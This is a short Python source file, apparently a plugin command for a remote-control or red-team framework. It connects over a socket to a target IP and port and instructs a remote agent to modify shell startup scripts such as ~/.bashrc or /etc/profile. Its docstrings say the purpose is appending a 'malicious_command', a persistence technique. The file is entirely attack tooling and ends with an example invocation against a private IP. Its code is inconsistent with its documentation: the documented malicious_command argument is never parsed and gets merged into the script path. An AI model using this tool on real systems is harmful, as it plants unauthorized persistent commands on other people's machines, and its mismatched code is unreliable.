from ..commands import Command
import socket


def process_lines(dst_ip, dst_port, script_path):
    """
    Connects to a given IP and port, sends commands to modify shell startup scripts.

    Args:
        dst_ip (str): Target IP address.
        dst_port (int): Target port number.
        script_path (str): Path to the shell startup script (e.g., ~/.bashrc or /etc/profile).
        malicious_command (str): Command to append to the startup script.
    """
    data_to_send = "startup_script " + script_path + "END"

    try:
        # connect to server
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((dst_ip, int(dst_port)))

        # send data to server and print response
        client_socket.send(data_to_send.encode())
        response = client_socket.recv(2048) # Can call multiple times to get more data
        print(
            "Data received from server -->\n", response.decode()
        )  # Decode bytes to string before printing
    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        # Close the socket
        client_socket.close()


class StartupScriptExploit(Command):
    """Modify shell startup scripts via socket communication."""

    def do_command(self, lines: str, *args):
        """
        Parses input and sends commands to modify shell startup scripts.
        """
        args = lines.split(" ", 2)
        if len(args) != 3:
            return

        dst_ip = args[0]
        dst_port = args[1]
        script_path = args[2]

        process_lines(dst_ip, dst_port, script_path)


command = StartupScriptExploit
# startup_scripts 192.168.20.129 5050 ~/.bashrc echo hi